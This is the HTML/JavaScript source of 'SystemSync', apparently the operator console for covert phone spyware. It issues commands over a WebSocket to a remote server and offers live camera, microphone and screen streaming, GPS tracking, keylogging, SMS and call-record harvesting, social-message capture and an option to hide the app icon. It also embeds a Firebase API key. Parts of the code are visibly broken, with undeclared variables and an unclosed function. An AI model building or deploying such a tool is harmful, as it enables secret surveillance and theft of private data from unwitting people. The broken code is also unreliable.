<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Remote Monitoring</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #f5f7fa; font-family: 'Segoe UI', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; }

        #sidebar {
            width: 280px; background: white; border-right: 1px solid #e0e4e8;
            padding: 16px; overflow-y: auto; flex-shrink: 0;
            transition: transform 0.28s ease; z-index: 200;
        }
        .logo { font-size: 18px; font-weight: 700; color: #1976ff; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; }
        #sidebarCloseBtn { display: none; background: none; border: none; font-size: 20px; cursor: pointer; color: #666; width: auto; }
        .section { margin-bottom: 20px; }
        .section-title { font-size: 11px; font-weight: 700; color: #7b8a9b; text-transform: uppercase; margin-bottom: 8px; }
        #sidebar button {
            width: 100%; padding: 9px 12px; margin: 2px 0; background: white;
            color: #1a2634; border: 1px solid #e8edf2; border-radius: 8px;
            font-size: 13px; text-align: left; cursor: pointer; transition: 0.15s;
            display: flex; align-items: center; gap: 8px;
        }
        #sidebar button:hover { background: #1976ff; color: white; border-color: #1976ff; }

        .camera-panel { background: #f5f7fa; border-radius: 8px; padding: 12px; margin: 6px 0; display: none; }
        .camera-panel.show { display: block; }
        .camera-option { margin: 6px 0; font-size: 13px; }
        .camera-option label { margin-right: 12px; color: #1a2634; }
        .capture-btn, .live-btn { background: #1976ff; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 8px; }

        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: #f5f7fa; }
        #header {
            height: 56px; background: white; border-bottom: 1px solid #e0e4e8;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 16px; flex-shrink: 0;
        }
        #menuBtn { display: none; background: none; border: 1px solid #e0e4e8; border-radius: 8px; padding: 6px 10px; font-size: 18px; cursor: pointer; width: auto; }
        #headerTitle { font-size: 15px; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        #status { padding: 5px 14px; border-radius: 20px; background: #e8f0fe; color: #1976ff; font-size: 12px; }
        #status.offline { background: #ffebee; color: #c62828; }
        #reconnectBtn { background: #1976ff; color: white; border: none; border-radius: 16px; padding: 5px 12px; font-size: 12px; cursor: pointer; width: auto; }
        #content { flex: 1; padding: 16px; overflow: auto; }
        #main-panel { background: white; border-radius: 12px; padding: 20px; min-height: 100%; }

        .file-manager { display: flex; flex-direction: column; height: 100%; }
        .file-toolbar-sticky {
            position: sticky; top: 0; background: white; z-index: 10;
            padding: 10px; border-bottom: 1px solid #eef2f5;
            display: flex; gap: 10px;
        }
        .file-toolbar { display: flex; gap: 8px; }
        .file-toolbar button {
            width: auto; margin: 0; padding: 8px 16px;
            font-size: 13px; text-align: center; justify-content: center;
        }
        .file-toolbar .delete-btn { background: #d32f2f; color: white; border: none; }
        .file-toolbar .download-btn { background: #1976ff; color: white; border: none; }
        .tree-content { flex: 1; overflow-y: auto; padding: 12px; }
        .tree-root { list-style: none; padding-left: 0; margin: 0; }
        .tree-item { margin: 2px 0; }
        .folder-header, .file-row {
            display: flex; align-items: center; padding: 6px 10px;
            border-radius: 6px; cursor: pointer; transition: background 0.15s;
        }
        .folder-header:hover, .file-row:hover { background: #f5f7fa; }
        .folder-icon, .file-icon { font-size: 16px; margin-right: 10px; width: 24px; text-align: center; }
        .item-name { font-size: 13px; color: #2c3e50; flex: 1; }
        .file-size { font-size: 11px; color: #94a3b8; margin-left: 8px; }
        .file-checkbox { width: 14px; height: 14px; margin-right: 10px; cursor: pointer; }

        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            display: none; justify-content: center; align-items: center; z-index: 10000;
        }
        .modal-overlay.show { display: flex; }
        .mobile-popup {
            width: min(92vw, calc(92vh * 9 / 16));
            height: min(92vh, calc(92vw * 16 / 9));
            display: flex; flex-direction: column;
            background: #0f0f0f; border-radius: 20px;
            border: 4px solid #2e2e2e; overflow: hidden;
        }
        .phone-frame { flex: 1; min-height: 0; background: black; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
        .popup-controls {
            flex-shrink: 0; background: #111; padding: 10px;
            display: flex; gap: 8px; justify-content: center;
            height: 56px;
        }
        .popup-controls button {
            width: 48px; height: 36px; background: #1e1e1e;
            color: white; border: none; border-radius: 8px;
            cursor: pointer; font-size: 16px;
            display: flex; align-items: center; justify-content: center;
        }
        .popup-controls button.close-btn { background: #c0392b; width: 56px; }

        #authContainer, #deviceListContainer {
            position: fixed; inset: 0; background: #f5f7fa;
            display: flex; justify-content: center; align-items: center; z-index: 20000;
        }
        #authBox, #deviceListBox {
            background: white; padding: 28px; border-radius: 12px;
            width: 340px; max-width: 92%;
        }
        #deviceListBox { width: 480px; max-height: 80vh; overflow-y: auto; }
        #authBox input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #ddd; border-radius: 6px; }
        #authBox button, #logoutBtn { width: 100%; padding: 10px; background: #1976ff; color: white; border: none; border-radius: 6px; cursor: pointer; }
        .device-item { display: flex; align-items: center; padding: 12px; border: 1px solid #e0e4e8; border-radius: 8px; margin-bottom: 8px; cursor: pointer; }
        .device-item:hover { background: #e3f2fd; }

        table { width: 100%; border-collapse: collapse; font-size: 13px; display: block; overflow-x: auto; }
        th { background: #f8fafd; padding: 10px 8px; text-align: left; border-bottom: 2px solid #e0e4e8; }
        td { padding: 8px; border-bottom: 1px solid #eef2f5; }
        .pagination { margin-top: 16px; display: flex; gap: 6px; justify-content: center; flex-wrap: wrap; }
        .page-btn { padding: 5px 10px; border: 1px solid #d0d9e2; background: white; border-radius: 6px; cursor: pointer; }

        #map { height: 380px; border-radius: 10px; position: relative; }
        .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); padding: 8px 12px; border-radius: 8px; font-size: 12px; border-left: 4px solid #1976ff; z-index: 1000; }
        #downloadProgress { background: white; border: 1px solid #1976ff; border-radius: 8px; padding: 10px; margin: 0 16px 10px; display: none; }
        #progressBar { width: 0%; height: 8px; background: #1976ff; border-radius: 4px; transition: width 0.3s; }

        @media (max-width: 768px) {
            #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: 2px 0 10px rgba(0,0,0,0.2); }
            #sidebar.open { transform: translateX(0); }
            #sidebarCloseBtn { display: flex; }
            #menuBtn { display: flex; }
            #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 99; }
            #sidebarOverlay.show { display: block; }
            #serverInfo { display: none; }
            #content { padding: 10px; }
        }
        @media (min-width: 769px) {
            #sidebar { position: relative; transform: none !important; display: flex !important; }
            #menuBtn { display: none !important; }
            #sidebarCloseBtn { display: none !important; }
            #sidebarOverlay { display: none !important; }
        }
        .ws-debug { font-size: 10px; color: #aaa; margin-top: 8px; }
        #alertsBadge { background: #fff3e0; border: 1px solid #ff9800; border-radius: 8px; padding: 10px; margin-top: 8px; }
        #sidebar, #main { display: none; }
        .app-usage-item { display: flex; align-items: center; padding: 12px; border-bottom: 1px solid #eef2f5; gap: 12px; }
        .app-usage-name { flex: 1; font-weight: 500; font-size: 13px; }
        .app-usage-time { width: 100px; text-align: right; color: #666; font-size: 12px; font-family: monospace; }
        .usage-bar-container { flex: 2; height: 28px; background: #f0f0f0; border-radius: 14px; overflow: hidden; }
        .usage-bar { height: 100%; border-radius: 14px; transition: width 0.3s; display: flex; align-items: center; justify-content: flex-end; padding-right: 8px; color: white; font-size: 11px; font-weight: 500; }
        .event-card { background: white; border: 1px solid #e0e4e8; border-radius: 8px; padding: 12px; margin-bottom: 8px; display: flex; align-items: center; gap: 12px; }
        .event-icon { font-size: 28px; }
        .event-details { flex: 1; }
        .event-title { font-weight: 600; font-size: 14px; }
        .event-meta { font-size: 11px; color: #999; margin-top: 4px; }
        .geofence-controls { margin-top: 12px; display: flex; gap: 8px; flex-wrap: wrap; }
        .geofence-controls button { padding: 8px 16px; background: #1976ff; color: white; border: none; border-radius: 6px; cursor: pointer; width: auto; }
        .current-location-marker { background: #d32f2f; border-radius: 50%; width: 12px; height: 12px; border: 2px solid white; }
    </style>
</head>
<body>

<div id="sidebarOverlay" onclick="closeSidebar()"></div>
<div id="authContainer"><div id="authBox"><h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
<div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList"></div><button id="logoutBtn">Logout</button></div></div>

<div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn" class="close-btn">✕</button></div></div></div>
<div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn" class="close-btn">✕</button></div></div></div>
<div id="audioModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><audio id="modalAudioPlayer" controls style="width:100%;"></audio></div><div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn" class="close-btn">✕</button></div></div></div>

<div id="sidebar"><div class="logo">SystemSync 🔗<button id="sidebarCloseBtn" onclick="closeSidebar()">✕</button></div>
    <div class="section"><div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
        <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label><label><input type="radio" name="clickCameraSelect" value="back"> Rear</label></div><div class="camera-option"><label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button></div>
        <button id="liveCameraBtn"><span>📹</span> See Live</button>
        <div id="liveCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label></div><div class="camera-option"><label><input type="checkbox" id="liveFlashCheckbox"> Use flash (back only)</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
        <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
        <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>
        <button id="getLocationBtn"><span>📍</span> GPS Location</button>
    </div>
    <div class="section"><div class="section-title">Data</div>
        <button id="fileManagerBtn"><span>📂</span> File Manager</button>
        <button id="smsBtn"><span>💬</span> SMS Messages</button>
        <button id="callLogsBtn"><span>📞</span> Call Logs</button>
        <button id="contactsBtn"><span>👥</span> Contacts</button>
        <button id="installedAppsBtn"><span>📱</span> Installed Apps</button>
        <button id="browserHistoryBtn"><span>🌐</span> Browser History</button>
        <button id="wifiNetworksBtn"><span>📶</span> Wi-Fi Networks</button>
    </div>
    <div class="section"><div class="section-title">Monitoring</div>
        <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
        <button id="socialMessagesBtn"><span>💬</span> Social Messages</button>
        <button id="keylogBtn"><span>⌨️</span> Keyboard Log</button>
        <button id="clipboardBtn"><span>📋</span> Clipboard</button>
        <button id="geofenceBtn"><span>🗺️</span> Geofence</button>
        <button id="autoCaptureBtn"><span>⏱️</span> Auto Capture</button>
        <button id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
        <button id="locationHistoryBtn"><span>📍</span> Location History</button>
        <button id="callRecordingsBtn"><span>🎙️</span> Call Recordings</button>
        <button id="photoGalleryBtn"><span>🖼️</span> Photo Gallery</button>
        <button id="appEventsBtn"><span>📦</span> App Events</button>
        <button id="smsKeywordsBtn"><span>🔑</span> SMS Keywords</button>
    </div>
    <div class="section"><div class="section-title">Control</div>
        <button id="toggleAppIconBtn"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button id="lockDeviceBtn"><span>🔒</span> Lock Screen</button>
        <button id="sendSmsBtn"><span>✉️</span> Send SMS</button>
        <button id="vibrateBtn"><span>📳</span> Vibrate</button>
        <button id="toggleFlashBtn"><span>🔦</span> <span id="flashBtn">Flash On</span></button>
        <button id="flashTimedBtn"><span>⏱️</span> Flash 5s</button>
    </div>
    <div id="alertsBadge" style="display:none;"><strong>⚠️ Alerts</strong><div id="alertsList"></div><button id="clearAlertsBtn">Clear</button></div>
    <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
</div>

<div id="main"><div id="header"><div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span></span></div><div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div></div>
<div id="downloadProgress"><div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div><div><div id="progressBar"></div></div></div>
<div id="content"><div id="main-panel">🔌 Initializing connection...</div></div></div>

<script>
const CONFIG = {
    WS_URL: "wss://mirror-view.onrender.com",
    MAX_RECONNECT_DELAY: 30000,
    ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
    FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
};

firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
const auth = firebase.auth();
const db = firebase.firestore();

let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
let currentData = [], currentPage = 0, dataType = null, currentPath = "root", selectedFiles = [];
let screenActive = false, iconHidden = false, flashOn = false, isLoginMode = true, liveGpsActive = false;
let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts = [];
let screenMediaRecorder = null, screenRecordedChunks = [];
let currentCameraStream = null, currentAudioStream = null;
let socialMsgsData = [], currentLocation = null;

const panel = document.getElementById('main-panel');
const statusEl = document.getElementById('status');
const wsDebug = document.getElementById('wsDebug');

function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
function formatDuration(ms) { const h=Math.floor(ms/3600000); const m=Math.floor((ms%3600000)/60000); const s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }
function getColorForDuration(ms) { if(ms>3600000) return '#d32f2f'; if(ms>1800000) return '#ff9800'; return '#4caf50'; }
function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE'){statusEl.classList.remove('offline');statusEl.style.background='#e8f5e9';statusEl.style.color='#2e7d32';}else{statusEl.classList.add('offline');statusEl.style.background='#ffebee';statusEl.style.color='#c62828';} }
function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t; setTimeout(()=>statusEl.innerText=o,2000); }
function pushAlert(t,b) { newAlerts.unshift({title:t,body:b,time:new Date().toLocaleTimeString()}); if(newAlerts.length>50)newAlerts.pop(); const badge=document.getElementById('alertsBadge'),list=document.getElementById('alertsList'); if(badge){badge.style.display='block';list.innerHTML='';newAlerts.forEach(a=>{const d=document.createElement('div');d.style.cssText='margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';d.textContent=a.time+' '+a.title+': '+a.body;list.appendChild(d);});} }
function clearAlerts() { newAlerts=[]; document.getElementById('alertsBadge').style.display='none'; }
function downloadBase64(b64,fn){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+b64; a.download=fn; a.click(); }

function toggleSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if(ov) ov.classList.toggle('show'); }
function closeSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if(ov) ov.classList.remove('show'); }

// AUTH
function renderAuthForm() {
    const c=document.getElementById('authBox');
    if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
    else c.innerHTML=`<h2>📝 Create Account</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" /><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
    document.getElementById('authBtn').onclick=handleAuth; document.getElementById('toggleAuthMode').onclick=()=>{isLoginMode=!isLoginMode;renderAuthForm();};
}
async function handleAuth(){
    const email=document.getElementById('authEmail').value.trim(), pwd=document.getElementById('authPassword').value.trim(), err=document.getElementById('authError');
    if(!email||!pwd){err.innerText='Please fill all fields';return;}
    try{
        let user;
        if(!isLoginMode){
            const cf=document.getElementById('authConfirmPassword').value.trim();
            if(pwd!==cf){err.innerText='Passwords do not match';return;}
            user=(await auth.createUserWithEmailAndPassword(email,pwd)).user;
        }else user=(await auth.signInWithEmailAndPassword(email,pwd)).user;
        currentUser=user;
        document.getElementById('authContainer').style.display='none';
        document.getElementById('deviceListContainer').style.display='flex';
        loadDevices();
    }catch(e){err.innerText=e.message;}
}
function logout(){ auth.signOut().then(()=>{ document.getElementById('deviceListContainer').style.display='none'; document.getElementById('sidebar').style.display='none'; document.getElementById('main').style.display='none'; document.getElementById('authContainer').style.display='flex'; if(ws)ws.close(); selectedDeviceId=null; isLoginMode=true; renderAuthForm(); }); }
async function loadDevices(){
    if(!currentUser)return;
    const snap=await db.collection('devices').where('userId','==',currentUser.uid).get();
    const list=document.getElementById('deviceList');
    list.innerHTML='';
    if(snap.empty) list.innerHTML='<p style="color:#999; text-align:center;">No devices registered.</p>';
    else snap.forEach(doc=>{ const d=doc.data(); const div=document.createElement('div'); div.className='device-item'; div.onclick=()=>selectDevice(d.deviceId,d.name||'Unknown'); div.innerHTML=`<span class="device-icon">📱</span><div class="device-info"><div class="device-name">${escapeHtml(d.name||'Unnamed device')}</div><div class="device-id">${escapeHtml(d.deviceId)}</div></div>`; list.appendChild(div); });
    document.getElementById('deviceListContainer').style.display='flex';
}
function selectDevice(id,name){
    selectedDeviceId=id;
    document.getElementById('deviceListContainer').style.display='none';
    document.getElementById('sidebar').style.display='';
    document.getElementById('main').style.display='flex';
    document.getElementById('serverInfo').innerText=`Device: ${name||id}`;
    connectWebSocket();
}

// WEBSOCKET
function connectWebSocket(){
    if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
    if(reconnectTimer)clearTimeout(reconnectTimer);
    setStatus('CONNECTING');
    if(wsDebug)wsDebug.innerText='🌐 WebSocket: connecting...';
    panel.innerHTML='⏳ Connecting to server...';
    ws=new WebSocket(CONFIG.WS_URL);
    ws.onopen=()=>{ reconnectAttempts=0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected to server. Ready.'; if(wsDebug)wsDebug.innerText='🌐 WebSocket: ONLINE'; };
    ws.onmessage=e=>handleIncomingMessage(e.data);
    ws.onclose=()=>{ setStatus('OFFLINE'); if(wsDebug)wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
    ws.onerror=()=>{ setStatus('ERROR'); if(wsDebug)wsDebug.innerText='🌐 WebSocket: error'; };
}
function manualReconnect(){ if(reconnectTimer)clearTimeout(reconnectTimer); if(ws)ws.close(); reconnectAttempts=0; connectWebSocket(); }
function sendCommand(cmd,params={}){
    if(!ws||ws.readyState!==WebSocket.OPEN){panel.innerHTML='<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>';return;}
    const payload={type:'COMMAND',command:cmd,requestId:'req_'+Date.now()+'_'+Math.random().toString(36).substr(2,5),params,deviceId:selectedDeviceId,timestamp:Date.now()};
    ws.send(JSON.stringify(payload));
    panel.innerHTML=`<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
    pendingCommand=cmd;
    setTimeout(()=>{ if(pendingCommand===cmd)pendingCommand=null; },10000);
}
function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }

// WEBRTC
function createPeerConnection(type,onTrack,useMic){
    const pc=new RTCPeerConnection({iceServers:CONFIG.ICE_SERVERS});
    if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic)pc.addTransceiver('audio',{direction:'recvonly'}); }
    else if(type==='audio') pc.addTransceiver('audio',{direction:'recvonly'});
    pc.ontrack=onTrack;
    pc.onicecandidate=e=>{ if(e.candidate) sendSignaling({type:'ICE_CANDIDATE',candidate:e.candidate,streamType:type}); };
    return pc;
}
function sendSignaling(msg){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
function handleSignaling(msg){
    if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
    else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
}

// CAMERA MODAL with flash support
function showCameraModal(stream, cameraType){
    const modal=document.getElementById('cameraModalOverlay');
    const video=document.getElementById('modalCameraVideo');
    video.srcObject=stream;
    currentCameraStream=stream;
    modal.classList.add('show');
    document.body.classList.add('modal-open');
    let recording=false, recorder=null, chunks=[];
    document.getElementById('cameraSnapBtn').onclick=()=>{
        const canvas=document.createElement('canvas');
        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(b=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download=`snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
    };
    document.getElementById('cameraRecordBtn').onclick=()=>{
        if(recording && recorder){ recorder.stop(); document.getElementById('cameraRecordBtn').innerText='🔴'; recording=false; }
        else{
            chunks=[]; const canvas=document.createElement('canvas'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            const ctx=canvas.getContext('2d');
            const draw=()=>{ ctx.drawImage(video,0,0,canvas.width,canvas.height); requestAnimationFrame(draw); };
            draw();
            const canvasStream=canvas.captureStream(30);
            if(stream.getAudioTracks().length) stream.getAudioTracks().forEach(t=>canvasStream.addTrack(t));
            recorder=new MediaRecorder(canvasStream);
            recorder.ondataavailable=e=>chunks.push(e.data);
            recorder.onstop=()=>{ const blob=new Blob(chunks,{type:'video/webm'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`recording_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob); canvasStream.getTracks().forEach(t=>t.stop()); };
            recorder.start(); recording=true; document.getElementById('cameraRecordBtn').innerText='🟢';
        }
    };
    document.getElementById('cameraFullscreenBtn').onclick=()=>{ if(video.requestFullscreen) video.requestFullscreen(); };
    document.getElementById('cameraCloseBtn').onclick=()=>{ 
        if(recorder&&recorder.state==='recording')recorder.stop(); 
        if(stream)stream.getTracks().forEach(t=>t.stop()); 
        modal.classList.remove('show'); 
        document.body.classList.remove('modal-open'); 
        if(cameraPC)cameraPC.close(); 
        cameraPC=null;
        // Turn off flash when stream stops
        if(cameraType === 'back') sendCommand('FLASH_OFF');
    };
}

function renderFiles() {
    const folders = currentData.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));

    folders.forEach(f=>{ html+=`<li class="tree-item"><div class="folder-header" onclick="handleFolderClick('${f.path}')"><span class="folder-icon">📁</span><span class="item-name">${escapeHtml(f.name)}</span></div></li>`; });
    files.forEach(f=>{ html+=`<li class="tree-item"><div class="file-row"><input type="checkbox" class="file-checkbox" data-path="${escapeHtml(f.path)}" onchange="updateSelected(this)"><span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span><span class="file-size">${formatBytes(f.size)}</span></div></li>`; });
    if(folders.length===0&&files.length===0) html+=`<li><div style="padding:20px;color:#999;">Empty folder</div></li>`;
    html+=`</ul></div></div>`; panel.innerHTML=html;
}
window.handleFolderClick=function(p){ currentPath=p; sendCommand('LIST_FILES',{path:p}); };

window.updateSelected=function(cb){ const p=cb.dataset.path; if(cb.checked){ if(!selectedFiles.includes(p))selectedFiles.push(p); }else selectedFiles=selectedFiles.filter(x=>x!==p); const c=selectedFiles.length; const ds=document.getElementById('downloadCount'); if(ds)ds.innerText=c; const dl=document.getElementById('deleteCount'); if(dl)dl.innerText=c; };

function renderMap(loc){
    let l=typeof loc==='string'?JSON.parse(loc):loc;
    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
    currentLocation={lat,lon,acc};
    panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 Current: ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
    if(mapInstance)mapInstance.remove();
    mapInstance=L.map('map').setView([lat,lon],18);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
    L.circle([lat,lon],{radius:acc,color:'#1976ff',fillColor:'#1976ff',fillOpacity:0.2}).addTo(mapInstance);
    L.marker([lat,lon],{icon:L.divIcon({className:'current-location-marker',iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Current Device Location');

// MESSAGE HANDLER
function handleJSON(json){
    if(Array.isArray(json)){
        if(pendingCommand==='LIST_FILES'){ currentData=json; renderFiles(); }
        else if(pendingCommand==='GET_SMS'){ displaySMS(json); }
        else if(pendingCommand==='GET_CALL_LOGS'){ const rows=json.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }
        pendingCommand=null; return;
    }
    switch(json.type){
        case 'FILE_LIST': try{ currentData=typeof json.data==='string'?JSON.parse(json.data):json.data; renderFiles(); }catch(e){} break;
        case 'SMS_DATA': try{ displaySMS(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_LOGS': try{ const d=typeof json.data==='string'?JSON.parse(json.data):json.data; const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){} break;
        case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
        case 'LOCATION_UPDATE': renderMap(json.data||json); break;
        case 'GEOFENCE_INFO': try{ displayGeofenceInfo(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'FILE_INFO': fileTransfers[json.transferId]={chunks:new Array(json.totalChunks),totalChunks:json.totalChunks,fileName:json.fileName,received:0}; document.getElementById('progressFileName').innerText=json.fileName; document.getElementById('progressPercent').innerText='0%'; document.getElementById('progressBar').style.width='0%'; document.getElementById('downloadProgress').style.display='block'; break;
